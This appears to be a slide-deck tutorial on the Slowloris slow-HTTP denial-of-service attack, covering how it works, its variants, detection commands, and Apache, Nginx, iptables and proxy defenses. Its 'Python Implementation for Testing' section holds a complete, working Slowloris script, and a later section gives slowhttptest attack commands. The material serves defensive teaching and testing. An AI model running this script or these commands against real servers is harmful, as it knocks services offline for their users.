# Slowloris Attack and Mitigation
---
## What is Slowloris Attack

- Slowloris is a type of Denial of Service (DoS) attack that targets web servers
- It works by opening multiple HTTP connections to the target server and keeping them open as long as possible
- This consumes all available connections/threads on the server, making it unable to serve legitimate requests
- Named after the slow loris primate, which moves very slowly
- Created by Robert "RSnake" Hansen in 2009
- Requires very low bandwidth compared to volumetric DDoS attacks

---
## How HTTP Connections Normally Work

```bash
┌─────────────────────────────────────────────────────────┐
│              Normal HTTP Request Flow                     │
│                                                          │
│  Client                            Server                │
│    │                                  │                   │
│    │  GET /index.html HTTP/1.1        │                   │
│    │  Host: example.com               │                   │
│    │  Connection: keep-alive          │                   │
│    │  <blank line = end of headers>   │                   │
│    │─────────────────────────────────>│                   │
│    │                                  │  Process request  │
│    │  HTTP/1.1 200 OK                 │                   │
│    │  Content-Type: text/html         │                   │
│    │  <response body>                 │                   │
│    │<─────────────────────────────────│                   │
│    │                                  │  Connection freed │
└─────────────────────────────────────────────────────────┘
```

- The server waits for the complete request (ending with a blank line)
- Once received, it processes and responds
- The connection slot is then freed for other clients

---
## How Slowloris Works

<svg xmlns="http://www.w3.org/2000/svg" width="700" height="340" font-family="sans-serif">
<defs>
  <marker id="arr"  markerWidth="10" markerHeight="7" refX="9"   refY="3.5" orient="auto">
    <polygon points="0 0,10 3.5,0 7" fill="#555"/>
  </marker>
  <marker id="arrl" markerWidth="10" markerHeight="7" refX="1"   refY="3.5" orient="auto">
    <polygon points="10 0,0 3.5,10 7" fill="#555"/>
  </marker>
</defs>
<text x="350" y="22" text-anchor="middle" font-size="14" fill="#222222" font-weight="bold">Slowloris Attack: Incomplete HTTP Headers</text>
<text x="120" y="44" text-anchor="middle" font-size="13" fill="#c62828" font-weight="bold">Attacker</text>
<text x="580" y="44" text-anchor="middle" font-size="13" fill="#1565c0" font-weight="bold">Server</text>
<line x1="120" y1="56" x2="120" y2="320" stroke="#aaa" stroke-width="1" stroke-dasharray="4,3"/>
<line x1="580" y1="56" x2="580" y2="320" stroke="#aaa" stroke-width="1" stroke-dasharray="4,3"/>
<line x1="140" y1="80" x2="560" y2="80" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="70" text-anchor="middle" font-size="11" fill="#333" font-style="italic">GET / HTTP/1.1\r\n  Host: target.com\r\n  (no blank line)</text>
<text x="600" y="84" text-anchor="start" font-size="11" fill="#c62828">Connection #1 held open…</text>
<line x1="140" y1="135" x2="560" y2="135" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="125" text-anchor="middle" font-size="11" fill="#333" font-style="italic">… 10 sec later …  X-Header-1: value\r\n</text>
<text x="600" y="139" text-anchor="start" font-size="11" fill="#c62828">Still waiting…</text>
<line x1="140" y1="190" x2="560" y2="190" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="180" text-anchor="middle" font-size="11" fill="#333" font-style="italic">… 10 sec later …  X-Header-2: value\r\n</text>
<text x="600" y="194" text-anchor="start" font-size="11" fill="#c62828">Still waiting…</text>
<line x1="140" y1="245" x2="560" y2="245" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="235" text-anchor="middle" font-size="11" fill="#333" font-style="italic">(repeat for hundreds of connections simultaneously)</text>
<text x="600" y="249" text-anchor="start" font-size="11" fill="#c62828">All slots consumed!</text>
<rect x="10" y="302" width="680" height="28" fill="#fff3e0" stroke="#f57c00" stroke-width="1.5" rx="4"/>
<text x="350" y="320" text-anchor="middle" font-size="12" fill="#e65100" font-weight="bold">Attacker keeps connections alive by drip-feeding headers — never completes the request</text>
</svg>

- The attacker sends partial HTTP headers, never completing the request
- Periodically sends additional header bytes to keep connections alive
- Server keeps each connection open waiting for the request to finish
- With enough connections, the server cannot accept legitimate clients

---
## Slowloris Step by Step

1. **Open connections**: Attacker opens hundreds of connections to the target
2. **Send partial headers**: Each connection sends an incomplete HTTP request
3. **Keep alive**: Periodically send additional headers to prevent timeout
4. **Exhaust pool**: Server connection pool fills up completely
5. **Deny service**: Legitimate users receive connection refused errors

---
## Why Slowloris is Effective

| Characteristic       | Slowloris              | Volumetric DDoS         |
|----------------------|------------------------|-------------------------|
| Bandwidth required   | Very low (< 1 Mbps)   | High (Gbps - Tbps)      |
| Packets per second   | Very few               | Millions                 |
| Detection difficulty | Hard                   | Easier (volume spikes)   |
| Single machine       | Can be effective       | Requires botnet          |
| Target               | Application layer      | Network layer            |
| Cost to attacker     | Nearly free            | Expensive infrastructure |

---
## Python Implementation for Testing

```python
#!/usr/bin/env python3
"""
Slowloris demonstration script - FOR AUTHORIZED TESTING ONLY
Only use against systems you own or have explicit permission to test.
"""

import socket
import time
import random
import threading

TARGET_HOST = "your-test-server.local"
TARGET_PORT = 80
NUM_SOCKETS = 200
KEEP_ALIVE_INTERVAL = 15  # seconds

def create_socket():
    """Create a socket and send partial HTTP headers."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    # Send partial HTTP request (no terminating blank line)
    s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {TARGET_HOST}\r\n".encode())
    s.send("User-Agent: Mozilla/5.0\r\n".encode())
    s.send("Accept: text/html\r\n".encode())
    return s

def slowloris_attack():
    sockets_list = []

    # Phase 1: Open initial connections
    print(f"[*] Opening {NUM_SOCKETS} connections...")
    for _ in range(NUM_SOCKETS):
        try:
            s = create_socket()
            sockets_list.append(s)
        except Exception as e:
            print(f"[-] Failed to create socket: {e}")

    print(f"[+] {len(sockets_list)} sockets connected")

    # Phase 2: Keep connections alive
    while True:
        print(f"[*] Sending keep-alive headers... "
              f"({len(sockets_list)} active)")
        for s in list(sockets_list):
            try:
                # Send additional header to keep connection open
                header = f"X-a: {random.randint(1, 5000)}\r\n"
                s.send(header.encode())
            except Exception:
                sockets_list.remove(s)
                try:
                    s = create_socket()
                    sockets_list.append(s)
                except Exception:
                    pass

        time.sleep(KEEP_ALIVE_INTERVAL)
```

> WARNING: Only use this against systems you own or have written authorization to test.

---
## Slowloris Variants

| Variant            | Technique                                     | Target          |
|--------------------|-----------------------------------------------|-----------------|
| Slowloris          | Partial HTTP headers                          | HTTP servers    |
| Slow POST (RUDY)  | Sends POST body one byte at a time            | HTTP servers    |
| Slow Read          | Reads response very slowly (tiny TCP window)  | HTTP servers    |
| Apache Killer      | Overlapping Range headers                     | Apache httpd    |
| HashDoS            | Crafted parameters causing hash collisions    | App frameworks  |

---
## Slow POST (R.U.D.Y.) Attack

<svg xmlns="http://www.w3.org/2000/svg" width="700" height="285" font-family="sans-serif">
<defs>
  <marker id="arr"  markerWidth="10" markerHeight="7" refX="9"   refY="3.5" orient="auto">
    <polygon points="0 0,10 3.5,0 7" fill="#555"/>
  </marker>
  <marker id="arrl" markerWidth="10" markerHeight="7" refX="1"   refY="3.5" orient="auto">
    <polygon points="10 0,0 3.5,10 7" fill="#555"/>
  </marker>
</defs>
<text x="350" y="22" text-anchor="middle" font-size="14" fill="#222222" font-weight="bold">Slow POST Attack: Incomplete HTTP Body</text>
<text x="120" y="44" text-anchor="middle" font-size="13" fill="#c62828" font-weight="bold">Attacker</text>
<text x="580" y="44" text-anchor="middle" font-size="13" fill="#1565c0" font-weight="bold">Server</text>
<line x1="120" y1="56" x2="120" y2="265" stroke="#aaa" stroke-width="1" stroke-dasharray="4,3"/>
<line x1="580" y1="56" x2="580" y2="265" stroke="#aaa" stroke-width="1" stroke-dasharray="4,3"/>
<line x1="140" y1="80" x2="560" y2="80" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="70" text-anchor="middle" font-size="11" fill="#333" font-style="italic">POST /login HTTP/1.1  Content-Length: 100000  &lt;blank line&gt;</text>
<text x="600" y="84" text-anchor="start" font-size="11" fill="#c62828">Expecting body…</text>
<line x1="140" y1="135" x2="560" y2="135" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="125" text-anchor="middle" font-size="11" fill="#333" font-style="italic">"a"  (1 byte every 10 seconds)</text>
<text x="600" y="139" text-anchor="start" font-size="11" fill="#c62828">Still waiting…</text>
<line x1="140" y1="190" x2="560" y2="190" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="350" y="180" text-anchor="middle" font-size="11" fill="#333" font-style="italic">"b"  (1 byte every 10 seconds)</text>
<text x="600" y="194" text-anchor="start" font-size="11" fill="#c62828">99,998 bytes to go…</text>
<rect x="10" y="247" width="680" height="28" fill="#fff3e0" stroke="#f57c00" stroke-width="1.5" rx="4"/>
<text x="350" y="265" text-anchor="middle" font-size="12" fill="#e65100" font-weight="bold">Server waits forever for the declared Content-Length — connection slot consumed</text>
</svg>

- Declares a large Content-Length but sends the body extremely slowly
- Server must keep the connection open to receive the full body
- Even harder to detect than standard Slowloris

---
## Detecting Slowloris Attacks

### Using netstat and ss

```bash
# Count connections per IP address
netstat -ntu | awk '{print $5}' | cut -d: -f1 | \
    sort | uniq -c | sort -rn | head -20

# Using ss (modern replacement for netstat)
ss -tn state established | awk '{print $5}' | \
    cut -d: -f1 | sort | uniq -c | sort -rn | head -20

# Show connections in ESTABLISHED state to port 80
ss -tn state established '( dport = :80 )'

# Count connections per state
ss -s

# Watch connection count in real time
watch -n 1 'ss -tn state established | wc -l'
```

### Signs of Slowloris Attack
- Unusually high number of connections from a single IP or small range
- Many connections in ESTABLISHED state with little data transfer
- Server response time degrading while bandwidth utilization is low
- Connection count approaching server max without proportional traffic

---
## Detection with Server Logs

```bash
# Apache: Check for many connections with long duration
tail -f /var/log/apache2/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Nginx: Monitor connection states
nginx -T 2>/dev/null | grep worker_connections

# Check for connections that have been open too long
# (requires custom logging or mod_status)
curl http://localhost/server-status?auto | \
    grep "Waiting\|Reading"
```

---
## Apache vs Nginx Resilience

| Feature                    | Apache (prefork/worker) | Nginx                    |
|----------------------------|------------------------|--------------------------|
| Connection model           | Thread per connection   | Event-driven (async)     |
| Default max connections    | 150-256                | 1024+ per worker         |
| Slowloris vulnerability    | HIGH                   | LOW                      |
| Resource per connection    | ~2-8 MB thread stack   | ~few KB per connection   |
| Idle connection cost       | Very expensive          | Very cheap               |
| Timeout handling           | Waits per thread       | Async timeout per event  |

<svg xmlns="http://www.w3.org/2000/svg" width="700" height="320" font-family="sans-serif">
<defs>
  <marker id="arr"  markerWidth="10" markerHeight="7" refX="9"   refY="3.5" orient="auto">
    <polygon points="0 0,10 3.5,0 7" fill="#555"/>
  </marker>
  <marker id="arrl" markerWidth="10" markerHeight="7" refX="1"   refY="3.5" orient="auto">
    <polygon points="10 0,0 3.5,10 7" fill="#555"/>
  </marker>
</defs>
<text x="350" y="22" text-anchor="middle" font-size="14" fill="#222222" font-weight="bold">Thread-per-Connection vs Event-Driven Model</text>
<rect x="10" y="40" width="310" height="240" fill="#ffebee" stroke="#c62828" stroke-width="1.5" rx="4"/>
<text x="165" y="62" text-anchor="middle" font-size="12" fill="#c62828" font-weight="bold">Apache (Thread-per-Connection)</text>
<rect x="30" y="72" width="80" height="80" fill="#ffcdd2" stroke="#ef9a9a" stroke-width="1.5" rx="4"/>
<text x="70" y="92" text-anchor="middle" font-size="11" fill="#222222" font-weight="bold">Thread</text>
<text x="70" y="110" text-anchor="middle" font-size="11" fill="#222222">Conn #1</text>
<text x="70" y="128" text-anchor="middle" font-size="11" fill="#222222">BLOCKED</text>
<rect x="120" y="72" width="80" height="80" fill="#ffcdd2" stroke="#ef9a9a" stroke-width="1.5" rx="4"/>
<text x="160" y="92" text-anchor="middle" font-size="11" fill="#222222" font-weight="bold">Thread</text>
<text x="160" y="110" text-anchor="middle" font-size="11" fill="#222222">Conn #2</text>
<text x="160" y="128" text-anchor="middle" font-size="11" fill="#222222">BLOCKED</text>
<rect x="210" y="72" width="80" height="80" fill="#ffcdd2" stroke="#ef9a9a" stroke-width="1.5" rx="4"/>
<text x="250" y="92" text-anchor="middle" font-size="11" fill="#222222" font-weight="bold">Thread</text>
<text x="250" y="110" text-anchor="middle" font-size="11" fill="#222222">Conn #3</text>
<text x="250" y="128" text-anchor="middle" font-size="11" fill="#222222">BLOCKED</text>
<text x="165" y="180" text-anchor="middle" font-size="11" fill="#b71c1c">3 slots consumed by 3 slow connections</text>
<text x="165" y="198" text-anchor="middle" font-size="11" fill="#b71c1c" font-weight="bold">Thread pool exhausted → server unresponsive</text>
<rect x="340" y="40" width="350" height="240" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5" rx="4"/>
<text x="515" y="62" text-anchor="middle" font-size="12" fill="#2e7d32" font-weight="bold">Nginx (Event-Driven)</text>
<rect x="360" y="72" width="290" height="100" fill="#c8e6c9" stroke="#388e3c" stroke-width="1.5" rx="4"/>
<text x="505" y="94" text-anchor="middle" font-size="12" fill="#1b5e20" font-weight="bold">Event Loop</text>
<text x="370" y="116" text-anchor="start" font-size="11" fill="#2e7d32">Conn#1</text>
<text x="370" y="130" text-anchor="start" font-size="11" fill="#2e7d32">Conn#2</text>
<text x="370" y="144" text-anchor="start" font-size="11" fill="#2e7d32">Conn#3</text>
<text x="370" y="158" text-anchor="start" font-size="11" fill="#2e7d32">… Conn#N</text>
<text x="515" y="196" text-anchor="middle" font-size="11" fill="#1b5e20">Thousands of slow conns handled</text>
<text x="515" y="212" text-anchor="middle" font-size="11" fill="#1b5e20" font-weight="bold">by a single worker thread</text>
</svg>

---
## Apache mod_reqtimeout Configuration

```apache
# /etc/apache2/mods-enabled/reqtimeout.conf
# (or httpd.conf on RHEL/CentOS)

# Enable the module
LoadModule reqtimeout_module modules/mod_reqtimeout.so

# Configure timeouts for request headers and body
<IfModule reqtimeout_module>
    # Header: 20 second initial timeout, then 40 bytes/sec minimum
    # Body: 20 second initial timeout, then 40 bytes/sec minimum
    RequestReadTimeout header=20-40,MinRate=500 body=20,MinRate=500
</IfModule>

# Additional protective settings
# Limit maximum number of connections per IP
<IfModule mod_limitipconn.c>
    MaxConnPerIP 10
</IfModule>

# Set keep-alive timeout low
KeepAliveTimeout 5
MaxKeepAliveRequests 100

# Reduce overall timeout
Timeout 30
```

```bash
# Enable the module on Debian/Ubuntu
sudo a2enmod reqtimeout
sudo systemctl restart apache2

# Verify module is loaded
apachectl -M | grep reqtimeout
```

---
## Nginx Configuration for Slowloris Defense

```nginx
# /etc/nginx/nginx.conf

http {
    # Limit connections per IP
    limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
    limit_conn conn_limit 20;

    # Limit request rate per IP
    limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;
    limit_req zone=req_limit burst=20 nodelay;

    # Aggressive timeouts for slow clients
    client_header_timeout 10s;
    client_body_timeout 10s;
    send_timeout 10s;
    keepalive_timeout 15s;

    # Limit header and body sizes
    large_client_header_buffers 2 1k;
    client_max_body_size 10m;

    server {
        listen 80;

        location / {
            # Apply rate limiting
            limit_req zone=req_limit;
            limit_conn conn_limit;

            proxy_pass http://backend;
        }
    }
}
```

---
## Rate Limiting with iptables

```bash
# Limit new connections per IP (max 20 per minute)
iptables -A INPUT -p tcp --dport 80 \
    -m connlimit --connlimit-above 20 \
    --connlimit-mask 32 -j DROP

# Limit new connection rate
iptables -A INPUT -p tcp --dport 80 \
    -m state --state NEW \
    -m recent --set --name HTTP

iptables -A INPUT -p tcp --dport 80 \
    -m state --state NEW \
    -m recent --update --seconds 60 --hitcount 30 \
    --name HTTP -j DROP

# Using nftables (modern replacement)
nft add rule inet filter input \
    tcp dport 80 \
    meter http_limit { ip saddr limit rate 20/minute } \
    accept

nft add rule inet filter input \
    tcp dport 80 drop
```

---
## Reverse Proxy as a Defense Layer

<svg xmlns="http://www.w3.org/2000/svg" width="700" height="340" font-family="sans-serif">
<defs>
  <marker id="arr"  markerWidth="10" markerHeight="7" refX="9"   refY="3.5" orient="auto">
    <polygon points="0 0,10 3.5,0 7" fill="#555"/>
  </marker>
  <marker id="arrl" markerWidth="10" markerHeight="7" refX="1"   refY="3.5" orient="auto">
    <polygon points="10 0,0 3.5,10 7" fill="#555"/>
  </marker>
</defs>
<text x="350" y="22" text-anchor="middle" font-size="14" fill="#222222" font-weight="bold">Reverse Proxy Protection Architecture</text>
<text x="60" y="48" text-anchor="middle" font-size="12" fill="#c62828" font-weight="bold">Attackers</text>
<text x="320" y="48" text-anchor="middle" font-size="12" fill="#1565c0" font-weight="bold">Reverse Proxy</text>
<text x="320" y="64" text-anchor="middle" font-size="12" fill="#1565c0" font-weight="bold">(Nginx/HAProxy)</text>
<text x="560" y="48" text-anchor="middle" font-size="12" fill="#2e7d32" font-weight="bold">Backend</text>
<text x="560" y="64" text-anchor="middle" font-size="12" fill="#2e7d32" font-weight="bold">(Apache)</text>
<rect x="20" y="80" width="60" height="34" fill="#ffcdd2" stroke="#ef9a9a" stroke-width="1.5" rx="4"/>
<text x="50" y="100" text-anchor="middle" font-size="12" fill="#b71c1c" font-weight="bold">A1</text>
<line x1="80" y1="97" x2="200" y2="97" stroke="#c62828" stroke-width="1.5" marker-end="url(#arr)" stroke-dasharray="5,3"/>
<rect x="20" y="130" width="60" height="34" fill="#ffcdd2" stroke="#ef9a9a" stroke-width="1.5" rx="4"/>
<text x="50" y="150" text-anchor="middle" font-size="12" fill="#b71c1c" font-weight="bold">A2</text>
<line x1="80" y1="147" x2="200" y2="147" stroke="#c62828" stroke-width="1.5" marker-end="url(#arr)" stroke-dasharray="5,3"/>
<rect x="20" y="180" width="60" height="34" fill="#ffcdd2" stroke="#ef9a9a" stroke-width="1.5" rx="4"/>
<text x="50" y="200" text-anchor="middle" font-size="12" fill="#b71c1c" font-weight="bold">A3</text>
<line x1="80" y1="197" x2="200" y2="197" stroke="#c62828" stroke-width="1.5" marker-end="url(#arr)" stroke-dasharray="5,3"/>
<rect x="200" y="70" width="230" height="180" fill="#e3f2fd" stroke="#1565c0" stroke-width="1.5" rx="4"/>
<text x="315" y="94" text-anchor="middle" font-size="12" fill="#1565c0" font-weight="bold">Event-driven proxy</text>
<text x="210" y="115" text-anchor="start" font-size="11" fill="#1a1a2e">• Connection timeouts</text>
<text x="210" y="137" text-anchor="start" font-size="11" fill="#1a1a2e">• Rate limiting</text>
<text x="210" y="159" text-anchor="start" font-size="11" fill="#1a1a2e">• Connection limits</text>
<text x="210" y="181" text-anchor="start" font-size="11" fill="#1a1a2e">• Full request buffering</text>
<text x="315" y="232" text-anchor="middle" font-size="11" fill="#c62828" font-weight="bold">Slow conns blocked here</text>
<rect x="480" y="70" width="190" height="180" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5" rx="4"/>
<text x="575" y="94" text-anchor="middle" font-size="12" fill="#2e7d32" font-weight="bold">Backend server</text>
<text x="575" y="116" text-anchor="middle" font-size="11" fill="#1b5e20">Only sees</text>
<text x="575" y="138" text-anchor="middle" font-size="11" fill="#1b5e20">complete requests</text>
<text x="575" y="160" text-anchor="middle" font-size="11" fill="#1b5e20">→ not vulnerable</text>
<line x1="430" y1="155" x2="480" y2="155" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
<text x="455" y="148" text-anchor="middle" font-size="10" fill="#555">complete
reqs only</text>
<rect x="10" y="296" width="680" height="34" fill="#f1f8e9" stroke="#aed581" stroke-width="1.5" rx="4"/>
<text x="350" y="318" text-anchor="middle" font-size="11" fill="#33691e">Slow connections are fully absorbed by the event-driven proxy — backend stays fast</text>
</svg>

- Place an event-driven reverse proxy (Nginx, HAProxy) in front of Apache
- The proxy absorbs slow connections efficiently
- Only complete, well-formed requests are forwarded to the backend
- This is the single most effective defense against Slowloris

---
## Cloud-Based Mitigation

| Service            | Feature                                  |
|--------------------|------------------------------------------|
| Cloudflare         | Automatic Slowloris protection at edge   |
| AWS ALB/CloudFront | Connection timeout and rate limiting     |
| Akamai             | Slow POST protection, connection limits  |
| Azure Front Door   | WAF rules for slow HTTP attacks          |

- Cloud CDN and WAF services sit in front of your origin server
- They handle thousands of concurrent connections efficiently
- Slow connections are terminated at the edge before reaching origin
- Often the simplest solution for production environments

---
## Testing Your Defenses

```bash
# Install slowhttptest (legitimate testing tool)
sudo apt install slowhttptest

# Test for Slowloris vulnerability
slowhttptest -c 1000 -H -g -o slowloris_test \
    -i 10 -r 200 -t GET -u http://your-server/ \
    -x 24 -p 3

# Test for Slow POST vulnerability
slowhttptest -c 1000 -B -g -o slow_post_test \
    -i 110 -r 200 -s 8192 -t POST \
    -u http://your-server/login -x 10 -p 3

# Flags explained:
#   -c 1000   : 1000 connections
#   -H        : Slowloris mode (slow headers)
#   -B        : Slow POST mode (slow body)
#   -i 10     : Interval between data sends (seconds)
#   -r 200    : Connection rate (per second)
#   -t GET    : HTTP method
#   -x 24     : Max length of follow-up data
#   -p 3      : Timeout to wait for response
```

---
## Monitoring and Alerting

```bash
#!/bin/bash
# Simple monitoring script for Slowloris-like attacks

THRESHOLD=50    # Max connections per IP
PORT=80
ALERT_EMAIL="admin@example.com"

while true; do
    # Get top connection counts per IP
    TOP_IPS=$(ss -tn state established "( dport = :${PORT} )" | \
        awk '{print $5}' | cut -d: -f1 | \
        sort | uniq -c | sort -rn | head -5)

    # Check if any IP exceeds threshold
    echo "$TOP_IPS" | while read COUNT IP; do
        if [ "$COUNT" -gt "$THRESHOLD" ]; then
            echo "[ALERT] $IP has $COUNT connections on port $PORT"
            # Optionally block the IP temporarily
            # iptables -A INPUT -s "$IP" -j DROP
        fi
    done

    sleep 10
done
```

---
## Defense Checklist

```bash
┌──────────────────────────────────────────────────────────┐
│          Slowloris Defense Checklist                      │
├──────────────────────────────────────────────────────────┤
│  [ ] Use event-driven web server (Nginx) or proxy       │
│  [ ] Configure request header/body timeouts             │
│  [ ] Set per-IP connection limits                       │
│  [ ] Enable rate limiting                               │
│  [ ] Deploy reverse proxy in front of Apache            │
│  [ ] Configure iptables/nftables connection limits      │
│  [ ] Set up monitoring and alerting                     │
│  [ ] Consider cloud-based WAF/CDN protection            │
│  [ ] Test defenses with slowhttptest                    │
│  [ ] Document incident response procedures              │
└──────────────────────────────────────────────────────────┘
```

---
## Key Takeaways

- Slowloris is a low-bandwidth, application-layer DoS attack
- It exploits the thread-per-connection model of servers like Apache
- Event-driven servers (Nginx) are naturally resilient
- Best defense: reverse proxy + timeouts + connection limits + rate limiting
- Regular testing with tools like slowhttptest validates your defenses
- Cloud WAF/CDN services provide the simplest production-grade protection
